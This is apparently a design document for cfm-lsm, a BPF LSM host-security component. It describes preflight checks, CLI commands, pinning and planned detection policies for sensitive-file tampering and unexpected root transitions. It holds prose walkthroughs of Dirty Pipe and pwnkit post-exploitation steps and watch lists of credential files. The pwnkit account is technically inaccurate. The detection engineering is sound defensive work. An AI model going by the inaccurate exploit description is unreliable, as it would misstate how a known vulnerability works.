daemon restarts, crashes, and `systemctl stop cfm` — only an
explicit `cfm lsm disable` detaches.

### Kernel preflight

Before any load attempt, seven things must hold. `cfm lsm status`
runs all seven and reports each one with a pass/fail/unknown verdict
and a specific remediation hint:

1. **Kernel version (informational).** Read from `/proc/version`.
   Reported but NOT a gate: RHEL-family vendor kernels backport BPF
   LSM to 4.18 (verified on AlmaLinux 8.10), so a uname comparison
   is the wrong proxy for capability. Capability is decided by the
   bpf-lsm-program-type probe below.
2. **`CONFIG_BPF_LSM=y` in the running kernel.** Verified via
   `/proc/config.gz` or `/boot/config-$(uname -r)`. Shipped enabled
   on AlmaLinux 8.6+ / 9+ / 10, CloudLinux 8 / 9+, RHEL 8.6+ / 9+,
   Debian 12+, Ubuntu 22.04+. Useful diagnostic, but on its own
   not sufficient — see (7).
3. **`bpf` in `/sys/kernel/security/lsm`.** EL-family stock kernels
   include `bpf` in the compile-time default LSM list. Debian /
   Ubuntu typically need the operator to add `bpf` to the kernel
   `lsm=` command line. The preflight prints the exact line to
   write to GRUB / `/etc/default/grub` / `/etc/kernel/cmdline`
   based on the detected bootloader.
4. **`/sys/kernel/btf/vmlinux` exists.** Required for CO-RE
   relocation. Present on AlmaLinux 8.6+, RHEL 9+, Debian 12+,
   Ubuntu 22.04+, and newer.
5. **The process has `CAP_BPF + CAP_PERFMON` or `CAP_SYS_ADMIN`.**
   `cfm` runs as root in production, so this passes; running an
   unprivileged `cfm lsm status` will see this check FAIL and
   the remediation prints the systemd `AmbientCapabilities=` line.
6. **`/sys/fs/bpf` mounted as type `bpf`.** bpffs is required for
   the pin-to-disk path. Systemd has mounted bpffs by default
   since v229 so this passes on every modern distro; the check
   exists for the rare stripped-down host.
7. **`BPF_PROG_TYPE_LSM` accepted by the bpf() syscall.** The
   authoritative capability gate: attempts a tiny no-op LSM program
   load via cilium/ebpf's `features.HaveProgramType(ebpf.LSM)`.
   Returns PASS when the verifier engages, FAIL when the kernel
   rejects the program type at dispatch (EINVAL). Required because
   some vendor kernels (notably CloudLinux 8's lve kernel) set
   `CONFIG_BPF_LSM=y` for the kernel-internal subsystem but do not
   expose the program type to userspace; this probe is the only
   way to tell those hosts apart from genuinely capable ones.

Preflight is read-only and can be run by anyone at any time —
it does not touch the kernel. Optional per-policy probes are reported
separately from component-wide preflight. Today that means
`CFML-CRED-003` checks whether `commit_creds` is visible as a tracing
target; if it is unavailable, `cfm lsm status` and `cfm lsm probe` report
that policy as unavailable but do not mark the whole LSM component failed
or prevent other enabled policies from attaching.

### CLI surface

| Command | Behaviour |
|---|---|
| `cfm lsm` | Alias for `cfm lsm status`. Read-only. |
| `cfm lsm status [--json]` | Preflight + lsm.conf state + live pinned attach state. Read-only. |
| `cfm lsm preview` | Predicts what `cfm lsm enable` would attach given the current conf + kernel. Read-only; never opens the kernel. |
| `cfm lsm init` | Writes the default `/etc/cfm/lsm.conf` if absent. |
| `cfm lsm enable` | Loads, attaches, and pins the BPF programs + ringbuf map to `/sys/fs/bpf/cfm/`. Programs stay attached past daemon and CLI exit. Needs root. |
| `cfm lsm disable` | Removes everything pinned under `/sys/fs/bpf/cfm/`. The kernel detaches the programs when the last reference drops. Needs root. |
| `cfm lsm help` | Usage. |

Three planned subcommands not in this MVP — `cfm lsm test`
(synthetic-trigger verification), `cfm lsm policy <id>` (detail
view), `cfm lsm reload` (hot policy reload) — are explicitly out
of scope for the first release and will land in subsequent
proposals.

### Two-process model

cfm-lsm runs across two cooperating processes:

**The CLI (`cfm lsm enable`)** loads the BPF programs, attaches
them to the `bprm_check_security` LSM hook, and *pins* both the
programs and the shared ringbuf map to bpffs under
`/sys/fs/bpf/cfm/`. After pinning, the CLI exits. The bpffs entries
keep their own kernel references, so the programs stay attached
even though no userspace process holds a fd on them. This is the
standard kernel idiom for "BPF program that outlives the loader."

**The cfm daemon** runs the
`internal/lsm/lifecycle.go` adoption path. On every config-reload
tick it checks two things: `enabled = true` in `/etc/cfm/lsm.conf`,
AND the pinned state exists at `/sys/fs/bpf/cfm/`. If both, the
daemon calls `AdoptPinned()` to open the pinned map, starts a
goroutine that drains the ringbuf, and forwards every detection
into the existing CFM notify pipeline (`notify.Event` with
`kind=lsm_detect`, `section=lsm`). Daemon shutdown closes the
userspace fds; the pinned programs stay attached at the kernel
level.

### What survives daemon downtime

| State change | Detection | Event collection |
|---|---|---|
| daemon running | works | events streamed live |
| daemon stopped (`systemctl stop cfm`) | **still works** | events buffer in ringbuf, drop when full |
| daemon crashed | **still works** | events buffer in ringbuf, drop when full |
| `cfm lsm disable` | **stopped** | n/a |

Audit emission is best-effort: a full or unavailable ringbuf may drop
the userspace event, but it does **not** change an established LSM
verdict. In monitor mode, a matched `CFML-EXEC-001` or
`CFML-EXEC-003` exec is still allowed if `bpf_ringbuf_reserve()`
fails; in enforce mode, the same matched exec is still denied.

Ringbuf size is 256 KiB; at the per-event size of 112 bytes that's
about 2,300 events before drops. EXEC-001 is a rare event in
practice (memfd exec is post-exploit only); EXEC-003 likewise.
Operators who care about full event capture during daemon
downtime can increase the ringbuf size in a follow-up.

### Pin layout on disk

```
/sys/fs/bpf/cfm/
├── maps/
│   └── cfm_events       # shared ringbuf map (BPF_MAP_TYPE_RINGBUF)
└── links/
    ├── cfm_memfd_exec   # CFML-EXEC-001 attached to bprm_check_security
    └── cfm_revshell     # CFML-EXEC-003 attached to bprm_check_security
```

Each file is an actual bpffs file with its own kernel refcount.
Removing a file via `rm` is equivalent to `cfm lsm disable` for
that entry — the kernel detaches the program when the last
reference drops. Operators can inspect the layout with `ls -la`
or `bpftool prog show` / `bpftool link show`.

### Failure modes and what happens

| Condition | CFM behaviour |
|---|---|
| Kernel rejects `BPF_PROG_TYPE_LSM` at bpf() syscall | Preflight fail on `bpf-lsm-program-type` (the authoritative gate); `cfm-lsm` unavailable; daemon runs normally. Observed on CloudLinux 8 lve kernels which set `CONFIG_BPF_LSM=y` for the internal subsystem only. |
| `CONFIG_BPF_LSM` absent | Preflight fail with "kernel was built without BPF LSM support; use a distro kernel that ships CONFIG_BPF_LSM=y (AlmaLinux 8.6+ / 9+ / 10, CloudLinux 9+, RHEL 9+, Debian 12+, Ubuntu 22.04+) or rebuild with CONFIG_BPF_LSM=y." |
| `bpf` not in `/sys/kernel/security/lsm` | Preflight fail with the exact remediation: which file to edit (`/etc/default/grub`, `/etc/kernel/cmdline`, or BLS entry), the `lsm=…` line to write, and the boot-args refresh command for the detected bootloader. |
| `vmlinux` BTF missing | Preflight fail; CO-RE not possible on this kernel. |
| Verifier rejects program | Log the verifier log at error level; mark that one policy as `failed`; other policies continue. |
| One LSM hook attach fails | Log; that one policy becomes `unavailable`; others continue. |
| Ringbuf full | Drop events with a counter increment; surfaced in `cfm lsm status`. |

The principle, lifted directly from `kernsec`'s posture: never break
the host. A misconfigured or unsupported `cfm-lsm` reduces to a no-op
plus a clear log message, never to a crashed daemon or a wedged
machine.

## Coexistence

**Imunify360 Proactive Defense.** Imunify PD is a Zend extension
hooking `zend_execute_ex` / `zend_execute_internal`; it sees PHP VM
calls only. `cfm-lsm` operates at LSM hooks one layer below; they are
complementary, not redundant. PD blocks the call that launches a
reverse shell; `cfm-lsm` blocks the resulting process if PD missed it
or was not loaded into that SAPI. The forward-looking analogue of
Imunify PD for non-Imunify hosts has its own design doc — see
[`cfm-php.md`](./cfm-php.md).

**CageFS / LVE.** CageFS namespaces away most FS-write vectors for
PHP-FPM workers on CloudLinux; the MVP policies (`CFML-EXEC-001`,
`CFML-EXEC-003`) are CageFS-orthogonal and do not duplicate it. LVE's
fork / PMEM / EP limits are not touched.

**KernelCare / Ksplice.** Live-patch modules load post-boot. The MVP
does not constrain module loading at all, so there is nothing to
whitelist. (This is one of the reasons `CFML-SELF-002` is out of
scope.)

**Stacked LSMs (SELinux / AppArmor / Yama / Lockdown).** The Linux LSM
stack runs each LSM in sequence; any LSM can deny, all must permit.
SELinux or AppArmor, where present, runs before `cfm-lsm`; their
denials never reach this layer. Yama runs alongside;
`kernel.yama.ptrace_scope=1` is already shipped by `kernsec`. Lockdown
runs alongside and is recommended at `integrity` but not required.
Tomoyo and Smack are untested and not on CFM's supported distros.

## Phased roadmap

The MVP roadmap shipped two phases, both about the exec-pair
(EXEC-001 / EXEC-003); the FS-005 / CRED-002 next-policies pass
added two more policies on top once the MVP had proven stable.

**Phase 1 — MVP, monitor mode. (Shipped.)**
`internal/lsm/` is stood up. The BPF C sources live at
`internal/lsm/bpf/`, with `bpf2go` `go generate` wiring and committed
compiled objects + Go bindings (so `go build` works with stock Go,
no clang). `CFML-EXEC-001` and `CFML-EXEC-003` attach in monitor
mode. Operator surface: `cfm lsm status` / `preview` / `probe` /
`enable` / `disable` / `init`. Activation is two-process: operator
runs `cfm lsm enable` (loads + pins to `/sys/fs/bpf/cfm/`), the cfm
daemon's `internal/lsm/lifecycle.go` adopts the pinned state on
every config-reload tick and forwards events into the existing
notify pipeline. Protection survives daemon restarts.
30-day telemetry collection runs on representative cPanel and
Proxmox hosts before any enforce promotion.

**Phase 2 — Promote MVP exec pair to enforce.** `CFML-EXEC-001` to
`enforce` once Phase 1 telemetry confirms zero or near-zero
legitimate triggers. `CFML-EXEC-003` to `enforce` once the FP rate
is verified against Phase 1 telemetry — likely later than
`EXEC-001` because of the behavioural fd walk. The flip is a bpf2go
constant rewrite — the program returns `-EPERM` instead of `0` on
a match; the rest of the architecture is unchanged.

**Next-policies pass — FS-005 + CRED-002 (shipped).** Two
additional policies were folded into the same `cfmlsm.bpf.c`
translation unit once the MVP's verifier and pinning behaviour
proved stable on EL10. FS-005 (sensitive-file modification by web
user) ships in monitor mode with an opt-in enforce flip; CRED-002
(post-setuid root transition outside the suid-binary allowlist) is
monitor-only by design because returning -EPERM from the
cred-install path can deadlock systemd.

**Kernsec integration — KSEC-LSM-bpf-001 (shipped).** Adding `bpf`
to the kernel `lsm=` command line is owned by kernsec via rule
`KSEC-LSM-bpf-001` (Tier 2, not forced by default). Forcing the
rule in `/etc/cfm/kernsec.conf` makes `cfm kernsec apply` merge
`bpf` into the operator's existing `lsm=` value without disrupting
the other LSMs; takes effect on the next reboot.

## Future Policies — Detailed Planning

This section is the design + continuation document for the next
two policies in the cfm-lsm roadmap, in implementation order:

1. **CFML-FS-005** — Sensitive-file modification by web user
2. **CFML-CRED-002** — Privilege escalation without setuid path

The "Out of scope" section above intentionally excluded earlier
versions of these ideas (`CFML-FS-001`, `CFML-CRED-001`). The
reversal is deliberate and worth recording: with EXEC-001 / EXEC-003
shipping in production, the bpf2go toolchain, the lifecycle, the
pinning model, the event pipeline, and the cilium/ebpf integration
have all been proven on real-kernel hosts. The marginal cost of
adding new policies is now "BPF C + a slice of `loader.go`" rather
than "a whole subsystem from scratch." Per-policy FP risk is also
no longer theoretical — EXEC-003's fd-walk taught us how the
verifier reacts to bounded loops on older kernels, which informs
the design choices below.

FS-005 and CRED-002 follow the same architectural shape as the
EXEC-001 / EXEC-003 MVP:
- compiled into the shared `cfmlsm.bpf.c` translation unit,
- attached via the existing Loader (`internal/lsm/loader.go`),
- pinned to `/sys/fs/bpf/cfm/links/<name>` by `cfm lsm enable`,
- events delivered through the existing ringbuf into the existing
  `notify.Event{kind=lsm_detect, section=lsm}` pipeline,
- monitor-only on first ship; FS-005 has an opt-in enforce flip
  behind a bpf2go constant rewrite, CRED-002 stays monitor-only by
  design (cred-install enforce can deadlock systemd).

Both stay focused on the "post-exploit cash-in" observable rather
than trying to detect the underlying kernel primitive. That is the
LSM-vs-LKRG line: LKRG-class tools try to catch kernel-side
corruption; cfm-lsm catches the moment the attacker tries to use
the corruption. The two layers are complementary, not competitive.

### CFML-FS-005 — Sensitive-file modification by web user

| | |
|---|---|
| Hook(s) | `inode_setattr`, `inode_create`, `inode_link`, `inode_unlink`, `inode_rename`, `inode_setxattr`; `bprm_check_security` / `task_fix_setuid` / `task_alloc` for origin state |
| Default mode | `monitor` |
| FP risk | Very low (CageFS makes legitimate access impossible) |
| Perf impact | Negligible — only fires on rare write-class operations against a small set of paths |
| Maps to add | `cfm_watched_uids` (hash, key=uid, val=u8), `cfm_watched_inodes` (hash, key=`cfm_inode_key` dev+ino, val=u8), `cfm_web_origin_tasks` (task-local storage for origin state) |

**Threat model.** A compromised web-tier user (apache, nginx,
php-fpm, lsphp, alt-php-N, plus every cPanel/DirectAdmin account
uid on hosting hosts) attempts to mutate a host-sensitive file:
`/etc/passwd`, `/etc/shadow`, `/etc/sudoers`, `/etc/sudoers.d/*`,
`/etc/cron*`, `/var/spool/cron/*`, `/etc/ssh/sshd_config*`,
`/root/.ssh/authorized_keys`, `/home/<other-user>/.ssh/*`,
`/etc/pam.d/*`. The compromise vector may be:

- A kernel 0-day (Dirty Pipe, Dirty COW class) that gave the user
  the ability to write where they shouldn't.
- A userspace exploit (e.g. PHP RCE) escalated via a setuid
  binary bug.
- Stolen credentials replayed.
- A misconfigured filesystem that exposed the path.

We do not need to know which. We watch the *attempt*, and on a
CFM target stack the attempt is itself the smoking gun — CageFS
on CloudLinux makes legitimate access to most of these paths
literally impossible for a caged user, and on non-CloudLinux
hosts the web users simply have no reason to touch them. The
signal-to-noise ratio of this rule is the highest of any candidate
post-MVP policy.

**Worked example — Dirty Pipe cash-in.**
1. Web user (uid 1001) compromised via a PHP RCE.
2. Attacker uses CVE-2022-0847 to write a backdoor line into
   `/etc/passwd`: a new uid 0 account with no password.
3. The Dirty Pipe primitive itself does not go through the
   standard write path — we cannot see it.
4. But the kernel page cache now reflects the modified content,
   and crucially the next operation the attacker performs to
   verify the modification (`stat`, `open(O_RDONLY)`, `read`) is
   irrelevant — they need to *use* the modification: log in as
   the new account. By that time the host's IDS / detector
   layer (sshd auth) has the signal.
5. **What CFML-FS-005 actually catches**: if the attacker
   instead modifies `/root/.ssh/authorized_keys` to add their
   own key, the underlying file write is via a normal syscall
   path (after the Dirty Pipe leg has corrupted the page cache,
   subsequent writes still take the page cache path). Or, the
   attacker uses a *different* primitive — for example, an
   unprivileged user-namespace exploit (CVE-2022-0185) to gain
   `CAP_SYS_ADMIN` and just write the file normally. Either way,
   the `inode_setattr` / `inode_create` for `/root/.ssh/` by uid
   1001 fires.
6. Event delivered: `policy=CFML-FS-005`, `pid=12345`,
   `uid=1001`, `comm=php-fpm`, `path=/root/.ssh/authorized_keys`,
   `op=create`. Operator gets a notify event in real time;
   forensic-grade evidence of compromise.

**Detection logic (BPF C pseudo-shape).**

```c
SEC("lsm/inode_setattr")
int BPF_PROG(cfm_fs005_setattr, struct dentry *dentry, struct iattr *attr, int ret)
{
    if (ret != 0) return ret;

    __u32 uid = bpf_get_current_uid_gid() & 0xffffffff;

    // Cheap reject: is this uid watched, or was the task marked web-origin?
    bool uid_watch = bpf_map_lookup_elem(&cfm_watched_uids, &uid) != NULL;
    bool origin_watch = cfm_task_is_web_origin(bpf_get_current_task());
    if (!uid_watch && !origin_watch) return 0;

    // Resolve target filesystem+inode key.
    struct inode *target = BPF_CORE_READ(dentry, d_inode);
    if (!target) return 0;
    struct cfm_inode_key key = {};
    if (!cfm_inode_key_from_inode(target, &key)) return 0;

    __u8 *watched = bpf_map_lookup_elem(&cfm_watched_inodes, &key);
    if (!watched) return 0;

    // Match. Emit event.
    emit_event(CFM_LSM_POLICY_SENSITIVE_WRITE, dentry, 0, "setattr");
    return 0; // monitor mode
}
```

The same shape repeats for `inode_create`, `inode_unlink`,
`inode_link`, `inode_rename`, `inode_setxattr`. Each is a
separate `SEC("lsm/...")` program but they share the
`cfm_watched_uids` and `cfm_watched_inodes` maps.

**Map population.** Both maps are populated by the cfm daemon at
attach time via the existing pinned-map pattern (or a sibling
pinned map populated by `cfm lsm enable`):

- `cfm_watched_uids`: walks `/etc/passwd` for web-class user
  names (`apache`, `nginx`, `www-data`, `http`, `php`, `lsphp`,
  `alt-php-*`, `proxy`, plus every cPanel-managed uid from
  `/etc/userdomains` or `/etc/trueuserdomains`, plus every
  DirectAdmin-managed uid from `/etc/virtual/domainowners`).
  Refreshed on every config-reload tick.
- `cfm_watched_inodes`: stat()s each path in the hard-coded stable core
  sensitive list, the hard-coded monitor-only persistence list, and operator
  additions from `/etc/cfm/lsm.conf`'s `[policy "CFML-FS-005"]
  persistence_path = ...` keys. The key is `(st_dev, st_ino)` and the value
  records whether the entry is enforceable core or monitor-only persistence.
  Filesystem+inode-based matching avoids the BPF-side
  dentry-walk-then-compare-string problem entirely while preventing
  cross-filesystem inode-number collisions.

**vmlinux.h extensions needed.**
- `struct iattr` (for `inode_setattr` hook). Only fields we
  read: none initially (the policy fires regardless of what's
  being changed — any write-class attempt is suspicious).
- No new types beyond `iattr`. `struct dentry`, `struct inode`
  are already in `internal/lsm/bpf/vmlinux.h` from EXEC-001/003.

**Verifier complexity.** Lower than EXEC-003. No bounded loops,
no fd walking; just three or four `BPF_CORE_READ` chains plus
two map lookups. Expected to load cleanly on EL10, Debian 12+,
Ubuntu 22.04+ kernels. Should work on RHEL 9.4+ kernels that
ship `CONFIG_BPF_LSM=y` (CL9 still does not; that is a separate
kernel-vendor blocker, not a verifier blocker).

**FP risk and mitigations.**
- **Near-zero on CageFS hosts.** A caged web user attempting to
  open `/etc/shadow` for write hits a CageFS denial long before
  cfm-lsm sees it. If cfm-lsm DOES see the attempt, it means
  caging was bypassed — which is itself a compromise indicator.
  We deliberately do NOT suppress events on CageFS hosts.
- **Non-trivial on non-CageFS hosts** in edge cases: tools that
  legitimately run as a web user and modify `/etc/`, e.g. a
  custom panel cron job, a Let's Encrypt renewal hook run as
  `www-data`, etc. Mitigation: keep FS-005 in monitor mode on that host until
  the helper is moved away from a watched web uid. Site-specific durable-hook
  directories can still be added as monitor-only telemetry in `lsm.conf`:
  ```
  [policy "CFML-FS-005"]
  mode = monitor
  origin_tracking = monitor
  persistence_path = /etc/letsencrypt/renewal-hooks/deploy
  ```
- **systemd-managed paths.** systemd's tmpfiles.d / udev rules
  can write to `/etc/` paths owned by services. The watched-uid
  set deliberately excludes root and system service accounts
  (uid < 100 by default), so systemd's writes are ignored.

**Stack-specific behavior.**

- **cPanel + CloudLinux + KernelCare.** Full policy applies.
  Every cpanel user uid is in the watched set. CageFS makes
  legitimate triggers vanishingly rare; any trigger should
  alert.
- **DirectAdmin + CloudLinux + KernelCare.** Same as cPanel,
  reading from `/etc/virtual/domainowners` instead.
- **Proxmox Debian KVM ZFS.** Limited watched-uid set
  (apache/nginx/www-data if present; otherwise dormant). The
  hypervisor has very few legitimate web-tier users by design,
  so the policy is mostly latent — but the moment a compromised
  guest reaches the host, the cash-in attempt fires.
- **Plain hosting (no panel)**. Watched-uid set populated from
  standard web server users. Operator can add extra monitor-only
  persistence paths with repeated `persistence_path = ...` entries.

**Event shape (extends existing `cfm_lsm_event`).**

The MVP event struct already carries `pid`, `tgid`, `uid`,
`gid`, `comm`, `filename`. For FS-005 the `filename` field
holds the target path (best-effort, truncated to
`CFM_FILENAME_LEN`). A new `op` field is needed to distinguish
`setattr` from `create` from `unlink` from `rename`. Add to
`common.bpf.h`:

```c
enum cfm_fs_op {
    CFM_FS_OP_UNKNOWN  = 0,
    CFM_FS_OP_SETATTR  = 1,
    CFM_FS_OP_CREATE   = 2,
    CFM_FS_OP_UNLINK   = 3,
    CFM_FS_OP_LINK     = 4,
    CFM_FS_OP_RENAME   = 5,
    CFM_FS_OP_SETXATTR = 6,
};
```

Carry the op as a single byte in a new `path_class` field
alongside the existing `_pad`. Update the Go-side `Event`
struct in `internal/lsm/events.go` and the wire size constant
to match.

**Enforcement strategy.**

Monitor-only on first ship. Enforce mode (return `-EACCES`)
would be a very strong control — denying the actual write —
but the cost of a false-positive enforce-mode block is severe
(a legitimate operator-driven cron job that touches `/etc/`
could fail), so the bar is high. Plan: 30-day monitor window
across at least 3 representative production hosts (cPanel,
DirectAdmin, plain), collect the operator-driven path list,
turn it into the shipped allowlist, *then* consider enforce.

**Open questions for FS-005.**

1. **Dentry path resolution in BPF.** The detection logic above
   uses filesystem+inode matching to avoid path-walking in BPF
   (which is verifier-painful). Inode numbers are filesystem-local, so the
   key includes stat-compatible `st_dev`/`s_dev` — `/etc/passwd` on a chroot has a different
   inode than the host's. CageFS exposes a different inode for
   the cage. Empirical question: does an attacker that has
   bypassed CageFS see the *host* inode for `/etc/shadow` or
   the cage's version? Needs a real CL host to test.
2. **Bind mounts.** A bind mount of `/etc/sudoers.d/` into a
   different path still resolves to the same filesystem+inode key; confirm
   any idmapped/overlay corner cases empirically. Worth checking how often
   operators bind-mount sensitive paths in practice.
3. **`/home/*/.ssh/` for other users.** Detecting "user A
   writing to user B's `.ssh/`" is the highest-value case,
   but distinguishing it from "user A writing to A's own
   `.ssh/`" requires knowing the path ownership, not just the
   path. Easiest implementation: skip the per-user `.ssh/`
   set entirely in v1, ship it as v1.1 once the
   uid-vs-path-owner correlation is sized.

### CFML-CRED-002 — Privilege escalation without setuid path

| | |
|---|---|
| Hook | `task_fix_setuid` (fires after the setuid syscall has written new->euid) |
| Default mode | `monitor` (extended window — 60 days, see below) |
| FP risk | Medium-low (whitelist of legitimate uid-0 transitions) |
| Perf impact | Cold — fires only on setuid-family syscalls (not every credential install) |
| Maps to add | `cfm_setuid_inodes` (hash, key=`cfm_inode_key` dev+ino, val=u8 — pre-populated set of legitimate setuid binaries) |

**Threat model.** A process gains effective uid 0 — or gains a
capability set it should not have — without going through a
recognised setuid binary or a legitimate root-owned parent in
the fork/exec chain. This is the canonical kernel-exploit
completion fingerprint. Concretely:

- Process P (web user, uid 1001) is running PHP-FPM.
- Attacker exploits a kernel bug (Dirty Pipe / CVE-2022-0185 /
  pwnkit-class / new 0-day) to flip P's `cred->euid` to 0.
- The flip happens *outside* the normal `setuid`/`execve`
  syscall paths — that's what makes it an exploit.
- Detection: at the next `cred_prepare` hook invocation (which
  fires when P calls `setuid()`, `setresuid()`, or when the
  kernel commits already-prepared creds), we compare:
  - new `cred->euid == 0`
  - old `cred->euid != 0`
  - parent's `mm->exe_file` inode NOT in
    `cfm_setuid_inodes` map
  - parent's `cred->euid != 0` at the time of exec
- If all four hold: emit event.

This is the LKRG-style detection but at the LSM layer. It
catches the *post-exploit fingerprint* — the moment the
attacker tries to *use* the kernel-side privilege flip — rather
than the kernel-side primitive itself. LKRG catches the
primitive by inspecting kernel state; cfm-lsm catches the
visible consequence by inspecting the cred-install path.

**Worked example — pwnkit cash-in.**
1. Web user calls a vulnerable `pkexec` binary in a way that
   triggers CVE-2021-4034.
2. The exploit flips `current->cred->euid = 0` via a kernel
   path that does *not* count as a setuid transition through
   pkexec's actual `cred_prepare`.
3. Process now runs as uid 0; opens a root shell or modifies
   `/etc/shadow`.
4. **What CFML-CRED-002 catches**: the cred install. The
   parent process at the time of pkexec exec was the web user
   (uid != 0); pkexec's inode IS in the setuid set; but the
   attack pattern abuses pkexec's own internal cred_prepare
   call where the *previous* commit had uid 1001 and the
   *new* commit has uid 0. The transition is legitimate from
   pkexec's perspective, but pkexec itself was the buggy
   binary. **Caveat: we will get a false positive on a
   legitimate pkexec invocation too**, which is exactly why
   this policy needs the long monitor window.

The harder case — and the more useful one — is the kernel
exploit that flips creds *without* touching the userspace
setuid binary at all (e.g. CVE-2022-0185 via user namespaces).
In that case the new cred has euid 0 but the parent exe is
NOT a setuid binary, and the cleanest detection lands.

**Detection logic (BPF C pseudo-shape).**

```c
SEC("lsm/task_fix_setuid")
int BPF_PROG(cfm_cred002, struct cred *new, const struct cred *old, int flags, int ret)
{
    if (ret != 0) return ret;

    __u32 new_euid = BPF_CORE_READ(new, euid.val);
    __u32 old_euid = BPF_CORE_READ(old, euid.val);

    // Only care about non-root → root transitions. (task_fix_setuid
    // fires AFTER the syscall has written new->euid, so this gate is
    // satisfiable. cred_prepare fires before the mutation and would
    // see new == old here, which is why we don't hook it.)
    if (new_euid != 0 || old_euid == 0) return 0;

    // Resolve current task's exe_file inode. If it's in the
    // known-setuid-binary set, the transition is from a
    // recognised setuid path — likely legitimate.
    struct task_struct *task = (void *)bpf_get_current_task();
    if (!task) return 0;

    struct mm_struct *mm = BPF_CORE_READ(task, mm);
    if (!mm) return 0;

    struct file *exe = BPF_CORE_READ(mm, exe_file);
    if (!exe) return 0;

    struct inode *exe_ino = BPF_CORE_READ(exe, f_inode);
    if (!exe_ino) return 0;

    struct cfm_inode_key key = {};
    if (!cfm_inode_key_from_inode(exe_ino, &key)) return 0;
    if (bpf_map_lookup_elem(&cfm_setuid_inodes, &key)) {
        // Legitimate setuid path; skip.
        return 0;
    }

    // Unrecognised path → fingerprint emission.
    emit_event(CFM_LSM_POLICY_CRED_ESCAL, exe, 0, "task_fix_setuid");
    return 0; // monitor mode
}
```

**Setuid-binary set population.** The cfm daemon walks the host
at attach time and stat()s every file with mode bits including
`S_ISUID`. Resulting filesystem+inode keys go into the pinned
`cfm_setuid_inodes` map. The walk is refreshed periodically
(every config-reload tick) so newly-installed setuid binaries
(after a package install) don't trigger FPs forever. Default
roots to walk: `/usr/bin`, `/usr/sbin`, `/usr/libexec`,
`/bin`, `/sbin`, plus any operator-listed extras in
`lsm.conf`.

**vmlinux.h extensions needed.**
- `struct cred { kuid_t uid, euid, suid, fsuid; kgid_t gid,
   egid, sgid, fsgid; ... }`. We read only `euid.val`.
- `kuid_t` and `kgid_t` are just typedef wrappers; carry as
   `struct kuid_t { __u32 val; }`.
- `struct mm_struct { struct file *exe_file; ... }`.
- `struct task_struct` already extended in EXEC-003; add the
   `mm` field to the existing partial definition.

**Verifier complexity.** Medium. Five BPF_CORE_READ chains
plus one map lookup. Should fit comfortably under the 1M-insn
budget on modern kernels and even older RHEL kernels. Watch
for the cred-walk specifically — `cred_prepare` runs with the
old/new cred passed in as args (not via `bpf_get_current_task()`),
so we get cheap access to them.

**FP risk and mitigations.**

- **`pkexec`, `sudo`, `su`, `passwd`, `mount`, `ping`, `chsh`,
  `chfn`, `gpasswd`, `newgrp`, `crontab`, `at`**: every standard
  setuid root binary will pass `cfm_setuid_inodes` lookup and
  emit no event. The walk has to find them all on the host
  type. CageFS-cloned `/usr/bin` may have a different inode for
  the cage's copy — does the cred_prepare fire with the cage's
  inode or the host's? Likely the cage's, since the running
  process is inside the namespace. The map population walk
  must therefore happen INSIDE the namespace too, or include
  both. Open question; see below.
- **systemd ambient capabilities.** Service workers spawned by
  systemd with `AmbientCapabilities=CAP_NET_BIND_SERVICE` (etc.)
  go through `cred_prepare` with new caps. They do *not*
  transition to uid 0 in the typical case, so the
  `new_euid == 0 && old_euid != 0` guard filters them out.
  Worth testing.
- **Container runtimes.** runc / containerd / podman set up
  creds inside their stage-0 init via paths that bypass the
  standard setuid model. Mitigation: an operator-editable
  process-name allowlist:
  ```
  [policy "CFML-CRED-002"]
  mode = monitor

  [policy "CFML-CRED-003"]
  mode = monitor
  allow_comm = runc,containerd-shim,podman
  ```
- **Polkit / systemd-resolved / accounts-daemon**. Modern
  desktop and some server systems use polkit IPC patterns that
  involve cred transitions over dbus. CFM target stacks
  (hosting, hypervisor) rarely have polkit running. If polkit
  IS running, allowlist it.

**Stack-specific behavior.**

- **cPanel + CloudLinux + KernelCare.** Apply. KernelCare's
  live-patch-loader (`kcare` binary) does run setuid-ish
  operations; needs verification that it's in the setuid set
  or in the allowlist. CageFS adds a wrinkle (host vs cage
  filesystem+inode keys) — needs empirical resolution.
- **DirectAdmin + CloudLinux + KernelCare.** Same as cPanel.
- **Proxmox Debian KVM ZFS.** Apply. Watch the LXC/QEMU
  helper binaries — `lxc-start-ephemeral`, `qm`, `pveproxy`,
  etc. — for setuid behaviour; allowlist as needed.
- **Plain hosting.** Apply. Smallest setuid set; cleanest
  signal.

**Event shape.** Same `cfm_lsm_event` struct as the others.
`filename` field carries the path of `current->mm->exe_file`.
A new `extra` field — or repurpose `path_class` from FS-005 —
carries the old_euid and new_euid for forensic context.

**Enforcement strategy.**

**Monitor only. Possibly never enforce.** Returning `-EPERM`
from `cred_prepare` is *dangerous* — it can deadlock the boot
sequence, crash systemd helpers mid-transition, and produce
hard-to-debug states. The value of CRED-002 is in the *alert*,
not the block. Even if we wanted enforce, the safe path is to
emit a notify event with very high severity and let downstream
take action (kill the process out-of-band, isolate the host,
etc.) rather than denying the cred install in-kernel. This
policy stays monitor-only by design.

**60-day monitor window** (vs 30 for the others) because the
FP surface for cred transitions is broader and varies by
distro+workload more than exec patterns do.

**Open questions for CRED-002.**

1. **CageFS inode mismatch.** Does the setuid-binary inode walk
   need to happen inside every CageFS namespace, or does the
   host walk suffice? Empirical, needs a CL host.
2. **`task_fix_setuid` vs `cred_prepare`.** Resolved. v1 ships
   on `task_fix_setuid`. `cred_prepare` runs *before* the caller
   has mutated `new->euid` (new is a byte-for-byte copy of old
   at the time the hook fires) which makes a non-root → root gate
   unsatisfiable. `task_fix_setuid` fires from the setuid syscall
   paths after the new cred's uid fields have been written, so
   the comparison is meaningful. The trade-off is that a kernel
   exploit installing creds directly via `commit_creds()` without
   going through a userspace setuid syscall is not caught — a
   kprobe on `commit_creds` is the canonical follow-up.
3. **Capability-only transitions.** A process that gains
   `CAP_SYS_ADMIN` without becoming uid 0 (via ambient caps
   or capability inheritance) is also suspicious. v1 only
   watches uid transitions; capability transitions are a
   v1.1 extension to scope.

### Continuation context for future implementation sessions

A future session picking up either policy cold should start
here. The MVP shipped (PRs #848 through #853) leaves the
following implementation surface ready to extend:

**Where existing code lives.**

```
internal/lsm/
├── bpf/
│   ├── cfmlsm.bpf.c        # both shipped programs (memfd, revshell)
│   ├── common.bpf.h        # event struct, policy enum, ringbuf decl
│   └── vmlinux.h           # hand-written CO-RE types (extend here)
├── bpf_generate.go         # go:generate directive (no change needed)
├── cfmlsm_x86_bpfel.{go,o} # committed artifacts (regenerate after C edits)
